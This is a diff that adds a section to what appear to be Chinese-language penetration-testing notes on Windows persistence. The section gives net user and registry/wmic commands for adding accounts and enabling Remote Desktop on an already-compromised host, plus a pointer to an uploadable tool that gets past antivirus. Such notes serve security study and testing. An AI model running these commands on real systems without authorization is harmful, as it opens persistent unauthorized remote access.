@@ -1,6 +1,34 @@
 持久化 - Windows
 ========================================
 
+开启远程登录
+----------------------------------------
+- 前提：执行系统命令。
+- 添加用户
+	+ net user命令
+	+ 其它
+		- 当主机含有杀毒软件时，则常规命令会被拦截，可将以下程序上传到目标机器，然后执行
+		- ``https://github.com/RuanLang0777/CreateUser``
+- 查看RDP端口
+	+ ``REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber``
+- 命令行开启
+	+ windows server 2003
+		::
+		
+			开启1：
+			REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+			关闭：
+			REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
+			开启2：
+			wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+			REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+			REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	+ windows server 2008
+		::
+		
+			REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
+	+ 注：0x00000d3d即3389。
+
 隐藏文件
 ----------------------------------------
 - 创建系统隐藏文件
